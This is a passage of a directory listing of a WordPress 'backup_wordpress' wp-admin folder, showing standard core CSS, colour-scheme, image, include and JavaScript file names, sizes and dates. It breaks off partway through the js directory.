-rw-r--r-- 1 www-data www-data 4.5K Dec  8  2015 upgrade.php
-rw-r--r-- 1 www-data www-data  13K Mar 14  2016 upload.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 user
-rw-r--r-- 1 www-data www-data  25K Mar 30  2016 user-edit.php
-rw-r--r-- 1 www-data www-data  21K Feb 24  2016 user-new.php
-rw-r--r-- 1 www-data www-data  18K Mar  9  2016 users.php
-rw-r--r-- 1 www-data www-data  18K Jan 30  2016 widgets.php

/var/www/backup_wordpress/wp-admin/css:
total 1.9M
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 8.3K Apr  9  2016 about-rtl.css
-rw-r--r-- 1 www-data www-data 5.8K Apr  9  2016 about-rtl.min.css
-rw-r--r-- 1 www-data www-data 8.3K Apr  9  2016 about.css
-rw-r--r-- 1 www-data www-data 5.8K Apr  9  2016 about.min.css
-rw-r--r-- 1 www-data www-data  20K Feb 19  2016 admin-menu-rtl.css
-rw-r--r-- 1 www-data www-data  16K Feb 19  2016 admin-menu-rtl.min.css
-rw-r--r-- 1 www-data www-data  20K Feb 19  2016 admin-menu.css
-rw-r--r-- 1 www-data www-data  16K Feb 19  2016 admin-menu.min.css
-rw-r--r-- 1 www-data www-data 2.3K Mar  9  2016 color-picker-rtl.css
-rw-r--r-- 1 www-data www-data 1.9K Mar  9  2016 color-picker-rtl.min.css
-rw-r--r-- 1 www-data www-data 2.3K Mar  9  2016 color-picker.css
-rw-r--r-- 1 www-data www-data 1.9K Mar  9  2016 color-picker.min.css
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 colors
-rw-r--r-- 1 www-data www-data  64K Mar 23  2016 common-rtl.css
-rw-r--r-- 1 www-data www-data  49K Mar 23  2016 common-rtl.min.css
-rw-r--r-- 1 www-data www-data  64K Mar 23  2016 common.css
-rw-r--r-- 1 www-data www-data  49K Mar 23  2016 common.min.css
-rw-r--r-- 1 www-data www-data  36K Mar 22  2016 customize-controls-rtl.css
-rw-r--r-- 1 www-data www-data  31K Mar 22  2016 customize-controls-rtl.min.css
-rw-r--r-- 1 www-data www-data  36K Mar 22  2016 customize-controls.css
-rw-r--r-- 1 www-data www-data  31K Mar 22  2016 customize-controls.min.css
-rw-r--r-- 1 www-data www-data  21K Mar 30  2016 customize-nav-menus-rtl.css
-rw-r--r-- 1 www-data www-data  17K Mar 30  2016 customize-nav-menus-rtl.min.css
-rw-r--r-- 1 www-data www-data  21K Mar 30  2016 customize-nav-menus.css
-rw-r--r-- 1 www-data www-data  17K Mar 30  2016 customize-nav-menus.min.css
-rw-r--r-- 1 www-data www-data  12K Mar 10  2016 customize-widgets-rtl.css
-rw-r--r-- 1 www-data www-data 9.3K Mar 10  2016 customize-widgets-rtl.min.css
-rw-r--r-- 1 www-data www-data  12K Mar 10  2016 customize-widgets.css
-rw-r--r-- 1 www-data www-data 9.3K Mar 10  2016 customize-widgets.min.css
-rw-r--r-- 1 www-data www-data  21K Mar  9  2016 dashboard-rtl.css
-rw-r--r-- 1 www-data www-data  16K Mar  9  2016 dashboard-rtl.min.css
-rw-r--r-- 1 www-data www-data  21K Mar  9  2016 dashboard.css
-rw-r--r-- 1 www-data www-data  16K Mar  9  2016 dashboard.min.css
-rw-r--r-- 1 www-data www-data 6.4K Mar  9  2016 deprecated-media-rtl.css
-rw-r--r-- 1 www-data www-data 5.2K Mar  9  2016 deprecated-media-rtl.min.css
-rw-r--r-- 1 www-data www-data 6.4K Mar  9  2016 deprecated-media.css
-rw-r--r-- 1 www-data www-data 5.2K Mar  9  2016 deprecated-media.min.css
-rw-r--r-- 1 www-data www-data  29K Apr  5  2016 edit-rtl.css
-rw-r--r-- 1 www-data www-data  22K Apr  5  2016 edit-rtl.min.css
-rw-r--r-- 1 www-data www-data  29K Apr  5  2016 edit.css
-rw-r--r-- 1 www-data www-data  22K Apr  5  2016 edit.min.css
-rw-r--r-- 1 www-data www-data  612 Nov 17  2013 farbtastic-rtl.css
-rw-r--r-- 1 www-data www-data  503 Jan 18  2016 farbtastic-rtl.min.css
-rw-r--r-- 1 www-data www-data  611 Nov 17  2013 farbtastic.css
-rw-r--r-- 1 www-data www-data  502 Jan 18  2016 farbtastic.min.css
-rw-r--r-- 1 www-data www-data  25K Feb 22  2016 forms-rtl.css
-rw-r--r-- 1 www-data www-data  19K Feb 22  2016 forms-rtl.min.css
-rw-r--r-- 1 www-data www-data  25K Feb 22  2016 forms.css
-rw-r--r-- 1 www-data www-data  19K Feb 22  2016 forms.min.css
-rw-r--r-- 1 www-data www-data  12K Mar  9  2016 ie-rtl.css
-rw-r--r-- 1 www-data www-data  10K Mar  9  2016 ie-rtl.min.css
-rw-r--r-- 1 www-data www-data  12K Mar  9  2016 ie.css
-rw-r--r-- 1 www-data www-data  10K Mar  9  2016 ie.min.css
-rw-r--r-- 1 www-data www-data 7.0K Mar  9  2016 install-rtl.css
-rw-r--r-- 1 www-data www-data 5.7K Mar  9  2016 install-rtl.min.css
-rw-r--r-- 1 www-data www-data 7.0K Mar  9  2016 install.css
-rw-r--r-- 1 www-data www-data 5.7K Mar  9  2016 install.min.css
-rw-r--r-- 1 www-data www-data 3.7K Nov 19  2015 l10n-rtl.css
-rw-r--r-- 1 www-data www-data 2.4K Jan 18  2016 l10n-rtl.min.css
-rw-r--r-- 1 www-data www-data 3.7K Nov 19  2015 l10n.css
-rw-r--r-- 1 www-data www-data 2.4K Jan 18  2016 l10n.min.css
-rw-r--r-- 1 www-data www-data  41K Mar 10  2016 list-tables-rtl.css
-rw-r--r-- 1 www-data www-data  33K Mar 10  2016 list-tables-rtl.min.css
-rw-r--r-- 1 www-data www-data  40K Mar 10  2016 list-tables.css
-rw-r--r-- 1 www-data www-data  33K Mar 10  2016 list-tables.min.css
-rw-r--r-- 1 www-data www-data 4.1K Jan 25  2016 login-rtl.css
-rw-r--r-- 1 www-data www-data  25K Feb 22  2016 login-rtl.min.css
-rw-r--r-- 1 www-data www-data 4.1K Jan 25  2016 login.css
-rw-r--r-- 1 www-data www-data  25K Feb 22  2016 login.min.css
-rw-r--r-- 1 www-data www-data  24K Mar  9  2016 media-rtl.css
-rw-r--r-- 1 www-data www-data  19K Mar  9  2016 media-rtl.min.css
-rw-r--r-- 1 www-data www-data  24K Mar  9  2016 media.css
-rw-r--r-- 1 www-data www-data  19K Mar  9  2016 media.min.css
-rw-r--r-- 1 www-data www-data  15K Mar  9  2016 nav-menus-rtl.css
-rw-r--r-- 1 www-data www-data  12K Mar  9  2016 nav-menus-rtl.min.css
-rw-r--r-- 1 www-data www-data  15K Mar  9  2016 nav-menus.css
-rw-r--r-- 1 www-data www-data  12K Mar  9  2016 nav-menus.min.css
-rw-r--r-- 1 www-data www-data 1.3K Jul 29  2015 press-this-editor-rtl.css
-rw-r--r-- 1 www-data www-data  714 Jan 18  2016 press-this-editor-rtl.min.css
-rw-r--r-- 1 www-data www-data 1.3K Jul 29  2015 press-this-editor.css
-rw-r--r-- 1 www-data www-data  713 Jan 18  2016 press-this-editor.min.css
-rw-r--r-- 1 www-data www-data  34K Mar  9  2016 press-this-rtl.css
-rw-r--r-- 1 www-data www-data  27K Mar  4  2016 press-this-rtl.min.css
-rw-r--r-- 1 www-data www-data  34K Mar  9  2016 press-this.css
-rw-r--r-- 1 www-data www-data  27K Mar  4  2016 press-this.min.css
-rw-r--r-- 1 www-data www-data  11K Feb 18  2016 revisions-rtl.css
-rw-r--r-- 1 www-data www-data 8.5K Feb 18  2016 revisions-rtl.min.css
-rw-r--r-- 1 www-data www-data  11K Feb 18  2016 revisions.css
-rw-r--r-- 1 www-data www-data 8.5K Feb 18  2016 revisions.min.css
-rw-r--r-- 1 www-data www-data  948 Mar  9  2016 site-icon-rtl.css
-rw-r--r-- 1 www-data www-data  659 Mar  9  2016 site-icon-rtl.min.css
-rw-r--r-- 1 www-data www-data  946 Mar  9  2016 site-icon.css
-rw-r--r-- 1 www-data www-data  657 Mar  9  2016 site-icon.min.css
-rw-r--r-- 1 www-data www-data  37K Mar  9  2016 themes-rtl.css
-rw-r--r-- 1 www-data www-data  29K Mar  9  2016 themes-rtl.min.css
-rw-r--r-- 1 www-data www-data  37K Mar  9  2016 themes.css
-rw-r--r-- 1 www-data www-data  29K Mar  9  2016 themes.min.css
-rw-r--r-- 1 www-data www-data  11K Feb 19  2016 widgets-rtl.css
-rw-r--r-- 1 www-data www-data 8.5K Feb 19  2016 widgets-rtl.min.css
-rw-r--r-- 1 www-data www-data  11K Feb 19  2016 widgets.css
-rw-r--r-- 1 www-data www-data 8.5K Feb 19  2016 widgets.min.css
-rw-r--r-- 1 www-data www-data  421 Jun 29  2015 wp-admin-rtl.css
-rw-r--r-- 1 www-data www-data  477 Jan 18  2016 wp-admin-rtl.min.css
-rw-r--r-- 1 www-data www-data  365 Jun 29  2015 wp-admin.css
-rw-r--r-- 1 www-data www-data  421 Jan 18  2016 wp-admin.min.css

/var/www/backup_wordpress/wp-admin/css/colors:
total 56K
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 _admin.scss
-rw-r--r-- 1 www-data www-data 1.5K Oct  8  2015 _mixins.scss
-rw-r--r-- 1 www-data www-data 1.9K Apr  5  2015 _variables.scss
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 blue
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 coffee
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 ectoplasm
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 light
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 midnight
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 ocean
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 sunrise

/var/www/backup_wordpress/wp-admin/css/colors/blue:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data  249 Feb  5  2014 colors.scss

/var/www/backup_wordpress/wp-admin/css/colors/coffee:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data  135 Feb  5  2014 colors.scss

/var/www/backup_wordpress/wp-admin/css/colors/ectoplasm:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data  157 Feb  5  2014 colors.scss

/var/www/backup_wordpress/wp-admin/css/colors/light:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data 1.1K Jul 15  2015 colors.scss

/var/www/backup_wordpress/wp-admin/css/colors/midnight:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data  106 Feb  5  2014 colors.scss

/var/www/backup_wordpress/wp-admin/css/colors/ocean:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data  157 Feb  5  2014 colors.scss

/var/www/backup_wordpress/wp-admin/css/colors/sunrise:
total 68K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors-rtl.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors-rtl.min.css
-rw-r--r-- 1 www-data www-data  14K Feb 22  2016 colors.css
-rw-r--r-- 1 www-data www-data  12K Feb 22  2016 colors.min.css
-rw-r--r-- 1 www-data www-data  166 Feb  5  2014 colors.scss

/var/www/backup_wordpress/wp-admin/images:
total 428K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  147 Sep 26  2012 align-center-2x.png
-rw-r--r-- 1 www-data www-data  546 Sep 24  2012 align-center.png
-rw-r--r-- 1 www-data www-data  143 Sep 26  2012 align-left-2x.png
-rw-r--r-- 1 www-data www-data  554 Sep 24  2012 align-left.png
-rw-r--r-- 1 www-data www-data  121 Sep 26  2012 align-none-2x.png
-rw-r--r-- 1 www-data www-data  417 Sep 24  2012 align-none.png
-rw-r--r-- 1 www-data www-data  142 Sep 26  2012 align-right-2x.png
-rw-r--r-- 1 www-data www-data  509 Sep 24  2012 align-right.png
-rw-r--r-- 1 www-data www-data  863 Sep 26  2012 arrows-2x.png
-rw-r--r-- 1 www-data www-data  243 Nov  7  2012 arrows.png
-rw-r--r-- 1 www-data www-data  40K Jun 30  2015 browser.png
-rw-r--r-- 1 www-data www-data  507 Feb 13  2014 bubble_bg-2x.gif
-rw-r--r-- 1 www-data www-data  398 Oct 28  2014 bubble_bg.gif
-rw-r--r-- 1 www-data www-data  258 Feb 13  2014 comment-grey-bubble-2x.png
-rw-r--r-- 1 www-data www-data  114 Nov  7  2012 comment-grey-bubble.png
-rw-r--r-- 1 www-data www-data  996 Oct 28  2014 date-button-2x.gif
-rw-r--r-- 1 www-data www-data  400 Oct 28  2014 date-button.gif
-rw-r--r-- 1 www-data www-data  719 Nov  7  2012 generic.png
-rw-r--r-- 1 www-data www-data  22K Oct 28  2014 icons32-2x.png
-rw-r--r-- 1 www-data www-data  21K Nov 24  2014 icons32-vs-2x.png
-rw-r--r-- 1 www-data www-data 7.9K Oct 28  2014 icons32-vs.png
-rw-r--r-- 1 www-data www-data 7.9K Oct 28  2014 icons32.png
-rw-r--r-- 1 www-data www-data 7.5K Oct 28  2014 imgedit-icons-2x.png
-rw-r--r-- 1 www-data www-data 4.0K Nov 24  2014 imgedit-icons.png
-rw-r--r-- 1 www-data www-data 1.5K Nov  7  2012 list-2x.png
-rw-r--r-- 1 www-data www-data 1003 Nov  7  2012 list.png
-rw-r--r-- 1 www-data www-data 2.3K Oct 28  2014 loading.gif
-rw-r--r-- 1 www-data www-data  360 Feb 13  2014 marker.png
-rw-r--r-- 1 www-data www-data 2.0K Sep 24  2012 mask.png
-rw-r--r-- 1 www-data www-data  850 Nov  7  2012 media-button-2x.png
-rw-r--r-- 1 www-data www-data  200 Oct 28  2014 media-button-image.gif
-rw-r--r-- 1 www-data www-data  206 Oct 28  2014 media-button-music.gif
-rw-r--r-- 1 www-data www-data  248 Oct 28  2014 media-button-other.gif
-rw-r--r-- 1 www-data www-data  133 Oct 28  2014 media-button-video.gif
-rw-r--r-- 1 www-data www-data  323 Nov  7  2012 media-button.png
-rw-r--r-- 1 www-data www-data  13K Oct 28  2014 menu-2x.png
-rw-r--r-- 1 www-data www-data  13K Oct 28  2014 menu-vs-2x.png
-rw-r--r-- 1 www-data www-data 5.0K Oct 28  2014 menu-vs.png
-rw-r--r-- 1 www-data www-data 5.0K Oct 28  2014 menu.png
-rw-r--r-- 1 www-data www-data  755 Nov  7  2012 no.png
-rw-r--r-- 1 www-data www-data 2.4K Oct 28  2014 post-formats-vs.png
-rw-r--r-- 1 www-data www-data 2.2K Feb 13  2014 post-formats.png
-rw-r--r-- 1 www-data www-data 5.0K Oct 28  2014 post-formats32-vs.png
-rw-r--r-- 1 www-data www-data 5.1K Oct 28  2014 post-formats32.png
-rw-r--r-- 1 www-data www-data  234 Feb 13  2014 resize-2x.gif
-rw-r--r-- 1 www-data www-data  233 Oct 28  2014 resize-rtl-2x.gif
-rw-r--r-- 1 www-data www-data  149 Oct 28  2014 resize-rtl.gif
-rw-r--r-- 1 www-data www-data   70 Oct 28  2014 resize.gif
-rw-r--r-- 1 www-data www-data  120 Nov  7  2012 se.png
-rw-r--r-- 1 www-data www-data   97 Oct 28  2014 sort-2x.gif
-rw-r--r-- 1 www-data www-data   55 Oct 28  2014 sort.gif
-rw-r--r-- 1 www-data www-data 8.4K Oct 28  2014 spinner-2x.gif
-rw-r--r-- 1 www-data www-data 4.1K Oct 28  2014 spinner.gif
-rw-r--r-- 1 www-data www-data 1.3K Nov  8  2012 stars-2x.png
-rw-r--r-- 1 www-data www-data  924 Nov  7  2012 stars.png
-rw-r--r-- 1 www-data www-data 3.1K Feb 13  2014 w-logo-blue.png
-rw-r--r-- 1 www-data www-data 5.3K Mar  9  2016 w-logo-white.png
-rw-r--r-- 1 www-data www-data 6.0K Oct 28  2014 wheel.png
-rw-r--r-- 1 www-data www-data 1.7K Mar  9  2016 wordpress-logo-white.svg
-rw-r--r-- 1 www-data www-data 2.5K Nov  7  2012 wordpress-logo.png
-rw-r--r-- 1 www-data www-data 1.5K Apr  5  2015 wordpress-logo.svg
-rw-r--r-- 1 www-data www-data 9.0K Oct 28  2014 wpspin_light-2x.gif
-rw-r--r-- 1 www-data www-data 2.2K Oct 28  2014 wpspin_light.gif
-rw-r--r-- 1 www-data www-data  825 Oct 28  2014 xit-2x.gif
-rw-r--r-- 1 www-data www-data  181 Oct 28  2014 xit.gif
-rw-r--r-- 1 www-data www-data  539 Sep 24  2012 yes.png

/var/www/backup_wordpress/wp-admin/includes:
total 2.2M
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 4.6K Oct 14  2015 admin-filters.php
-rw-r--r-- 1 www-data www-data 2.9K Mar  9  2016 admin.php
-rw-r--r-- 1 www-data www-data  91K Mar 30  2016 ajax-actions.php
-rw-r--r-- 1 www-data www-data 8.9K Oct 14  2015 bookmark.php
-rw-r--r-- 1 www-data www-data 5.4K Sep 18  2015 class-ftp-pure.php
-rw-r--r-- 1 www-data www-data 8.4K Sep 18  2015 class-ftp-sockets.php
-rw-r--r-- 1 www-data www-data  27K Dec 14  2015 class-ftp.php
-rw-r--r-- 1 www-data www-data 192K Jun 28  2015 class-pclzip.php
-rw-r--r-- 1 www-data www-data 4.1K Sep 22  2015 class-walker-category-checklist.php
-rw-r--r-- 1 www-data www-data 4.9K Oct 15  2015 class-walker-nav-menu-checklist.php
-rw-r--r-- 1 www-data www-data  11K Mar 30  2016 class-walker-nav-menu-edit.php
-rw-r--r-- 1 www-data www-data  26K Feb 12  2016 class-wp-comments-list-table.php
-rw-r--r-- 1 www-data www-data  23K Jan  9  2016 class-wp-filesystem-base.php
-rw-r--r-- 1 www-data www-data  12K Sep  9  2015 class-wp-filesystem-direct.php
-rw-r--r-- 1 www-data www-data  14K Dec 14  2015 class-wp-filesystem-ftpext.php
-rw-r--r-- 1 www-data www-data  11K Dec 14  2015 class-wp-filesystem-ftpsockets.php
-rw-r--r-- 1 www-data www-data  16K Feb 23  2016 class-wp-filesystem-ssh2.php
-rw-r--r-- 1 www-data www-data 7.1K Oct 14  2015 class-wp-importer.php
-rw-r--r-- 1 www-data www-data 4.3K Sep 22  2015 class-wp-internal-pointers.php
-rw-r--r-- 1 www-data www-data 7.7K Mar  2  2016 class-wp-links-list-table.php
-rw-r--r-- 1 www-data www-data  38K Dec  7  2015 class-wp-list-table.php
-rw-r--r-- 1 www-data www-data  22K Mar  8  2016 class-wp-media-list-table.php
-rw-r--r-- 1 www-data www-data  16K Feb 23  2016 class-wp-ms-sites-list-table.php
-rw-r--r-- 1 www-data www-data  20K Jan 25  2016 class-wp-ms-themes-list-table.php
-rw-r--r-- 1 www-data www-data  13K Feb 18  2016 class-wp-ms-users-list-table.php
-rw-r--r-- 1 www-data www-data  17K Mar 30  2016 class-wp-plugin-install-list-table.php
-rw-r--r-- 1 www-data www-data  31K Mar 10  2016 class-wp-plugins-list-table.php
-rw-r--r-- 1 www-data www-data 1.5K Oct 17  2015 class-wp-post-comments-list-table.php
-rw-r--r-- 1 www-data www-data  50K Mar  9  2016 class-wp-posts-list-table.php
-rw-r--r-- 1 www-data www-data  49K Mar 12  2016 class-wp-press-this.php
-rw-r--r-- 1 www-data www-data  34K Mar  7  2016 class-wp-screen.php
-rw-r--r-- 1 www-data www-data 6.2K Oct 20  2015 class-wp-site-icon.php
-rw-r--r-- 1 www-data www-data  18K Jan 11  2016 class-wp-terms-list-table.php
-rw-r--r-- 1 www-data www-data  15K Feb 25  2016 class-wp-theme-install-list-table.php
-rw-r--r-- 1 www-data www-data 9.2K Oct 17  2015 class-wp-themes-list-table.php
-rw-r--r-- 1 www-data www-data  29K Dec 10  2015 class-wp-upgrader-skins.php
-rw-r--r-- 1 www-data www-data 121K Mar 14  2016 class-wp-upgrader.php
-rw-r--r-- 1 www-data www-data  16K Oct 17  2015 class-wp-users-list-table.php
-rw-r--r-- 1 www-data www-data 5.6K Oct 18  2015 comment.php
-rw-r--r-- 1 www-data www-data  18K Oct 22  2015 continents-cities.php
-rw-r--r-- 1 www-data www-data 2.0K Dec 22  2015 credits.php
-rw-r--r-- 1 www-data www-data  52K Mar 10  2016 dashboard.php
-rw-r--r-- 1 www-data www-data  35K Jan 27  2016 deprecated.php
-rw-r--r-- 1 www-data www-data 1.4K Sep 15  2015 edit-tag-messages.php
-rw-r--r-- 1 www-data www-data  19K Oct 14  2015 export.php
-rw-r--r-- 1 www-data www-data  51K Mar 12  2016 file.php
-rw-r--r-- 1 www-data www-data  32K Jan  8  2016 image-edit.php
-rw-r--r-- 1 www-data www-data  20K Mar 12  2016 image.php
-rw-r--r-- 1 www-data www-data 6.2K Sep 25  2015 import.php
-rw-r--r-- 1 www-data www-data 3.6K Jan  8  2016 list-table.php
-rw-r--r-- 1 www-data www-data 100K Mar 18  2016 media.php
-rw-r--r-- 1 www-data www-data 8.6K Oct 28  2015 menu.php
-rw-r--r-- 1 www-data www-data  49K Mar 16  2016 meta-boxes.php
-rw-r--r-- 1 www-data www-data  26K Feb 19  2016 misc.php
-rw-r--r-- 1 www-data www-data 1.3K Feb  7  2016 ms-admin-filters.php
-rw-r--r-- 1 www-data www-data 2.8K Oct 27  2015 ms-deprecated.php
-rw-r--r-- 1 www-data www-data  38K Feb 24  2016 ms.php
-rw-r--r-- 1 www-data www-data  39K Mar 30  2016 nav-menu.php
-rw-r--r-- 1 www-data www-data  23K Feb 24  2016 network.php
-rw-r--r-- 1 www-data www-data 1.1K Sep 10  2015 noop.php
-rw-r--r-- 1 www-data www-data 4.1K Jan 27  2016 options.php
-rw-r--r-- 1 www-data www-data  30K Apr  2  2016 plugin-install.php
-rw-r--r-- 1 www-data www-data  67K Mar  3  2016 plugin.php
-rw-r--r-- 1 www-data www-data  58K Mar  9  2016 post.php
-rw-r--r-- 1 www-data www-data  15K Feb 23  2016 revision.php
-rw-r--r-- 1 www-data www-data  37K Feb 23  2016 schema.php
-rw-r--r-- 1 www-data www-data 5.9K Jan  2  2016 screen.php
-rw-r--r-- 1 www-data www-data 7.6K Dec 16  2015 taxonomy.php
-rw-r--r-- 1 www-data www-data  75K Mar 30  2016 template.php
-rw-r--r-- 1 www-data www-data 6.2K Dec 15  2015 theme-install.php
-rw-r--r-- 1 www-data www-data  27K Mar  4  2016 theme.php
-rw-r--r-- 1 www-data www-data 8.1K Oct  5  2015 translation-install.php
-rw-r--r-- 1 www-data www-data  51K Mar  3  2016 update-core.php
-rw-r--r-- 1 www-data www-data  20K Mar 10  2016 update.php
-rw-r--r-- 1 www-data www-data  87K Mar 13  2016 upgrade.php
-rw-r--r-- 1 www-data www-data  17K Mar 22  2016 user.php
-rw-r--r-- 1 www-data www-data 9.3K Oct 10  2015 widgets.php

/var/www/backup_wordpress/wp-admin/js:
total 1.3M
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.9K Jul 29  2015 accordion.js
-rw-r--r-- 1 www-data www-data  837 Jul 29  2015 accordion.min.js
-rw-r--r-- 1 www-data www-data 3.9K Jun 17  2015 bookmarklet.js
-rw-r--r-- 1 www-data www-data 2.1K Jun 17  2015 bookmarklet.min.js
-rw-r--r-- 1 www-data www-data 4.7K Oct 12  2015 color-picker.js
-rw-r--r-- 1 www-data www-data 2.7K Oct 12  2015 color-picker.min.js
-rw-r--r-- 1 www-data www-data 2.0K Jul 25  2015 comment.js
-rw-r--r-- 1 www-data www-data 1.3K Jul 25  2015 comment.min.js
-rw-r--r-- 1 www-data www-data  26K Jan 22  2016 common.js
-rw-r--r-- 1 www-data www-data  14K Jan 22  2016 common.min.js
-rw-r--r-- 1 www-data www-data 1.9K Nov 13  2013 custom-background.js
-rw-r--r-- 1 www-data www-data  900 Jan 28  2014 custom-background.min.js
-rw-r--r-- 1 www-data www-data 1.5K Nov 13  2013 custom-header.js
-rw-r--r-- 1 www-data www-data 106K Apr  7  2016 customize-controls.js
-rw-r--r-- 1 www-data www-data  45K Apr  7  2016 customize-controls.min.js
-rw-r--r-- 1 www-data www-data  87K Mar  9  2016 customize-nav-menus.js
-rw-r--r-- 1 www-data www-data  40K Mar  9  2016 customize-nav-menus.min.js
-rw-r--r-- 1 www-data www-data  64K Mar 21  2016 customize-widgets.js
-rw-r--r-- 1 www-data www-data  26K Mar 21  2016 customize-widgets.min.js
-rw-r--r-- 1 www-data www-data 5.7K Oct  8  2015 dashboard.js
-rw-r--r-- 1 www-data www-data 3.2K Oct  8  2015 dashboard.min.js
-rw-r--r-- 1 www-data www-data  27K Feb 28  2016 edit-comments.js
-rw-r--r-- 1 www-data www-data  14K Feb 28  2016 edit-comments.min.js
-rw-r--r-- 1 www-data www-data  34K Mar 15  2016 editor-expand.js
-rw-r--r-- 1 www-data www-data  14K Mar 15  2016 editor-expand.min.js
-rw-r--r-- 1 www-data www-data  12K Dec 17  2015 editor.js
-rw-r--r-- 1 www-data www-data 6.2K Dec 17  2015 editor.min.js
-rw-r--r-- 1 www-data www-data 7.6K Nov 11  2010 farbtastic.js
-rw-r--r-- 1 www-data www-data 5.5K Oct  8  2015 gallery.js
-rw-r--r-- 1 www-data www-data 3.8K Oct  8  2015 gallery.min.js
-rw-r--r-- 1 www-data www-data  17K Jan  8  2016 image-edit.js
-rw-r--r-- 1 www-data www-data 9.4K Jan  8  2016 image-edit.min.js
-rw-r--r-- 1 www-data www-data  12K Jan 21  2016 inline-edit-post.js
-rw-r--r-- 1 www-data www-data 7.3K Jan 21  2016 inline-edit-post.min.js
-rw-r--r-- 1 www-data www-data 4.3K Jan 14  2016 inline-edit-tax.js
-rw-r--r-- 1 www-data www-data 2.7K Jan 14  2016 inline-edit-tax.min.js
-rw-r--r-- 1 www-data www-data  22K Nov 30  2014 iris.min.js
-rw-r--r-- 1 www-data www-data  625 Aug  4  2014 language-chooser.js
-rw-r--r-- 1 www-data www-data  374 Aug  4  2014 language-chooser.min.js
-rw-r--r-- 1 www-data www-data 2.2K Nov 14  2013 link.js
-rw-r--r-- 1 www-data www-data 1.7K Nov 13  2013 link.min.js
-rw-r--r-- 1 www-data www-data  769 Nov 15  2013 media-gallery.js
-rw-r--r-- 1 www-data www-data  537 Nov 13  2013 media-gallery.min.js
-rw-r--r-- 1 www-data www-data 2.0K Jan 13  2016 media-upload.js
-rw-r--r-- 1 www-data www-data 1.2K Jan 13  2016 media-upload.min.js
-rw-r--r-- 1 www-data www-data 2.8K Apr  2  2015 media.js
-rw-r--r-- 1 www-data www-data 1.8K Apr  2  2015 media.min.js
-rw-r--r-- 1 www-data www-data  41K Mar 10  2016 nav-menu.js
-rw-r--r-- 1 www-data www-data  21K Feb 11  2016 nav-menu.min.js
-rw-r--r-- 1 www-data www-data 2.3K Nov 14  2013 password-strength-meter.js
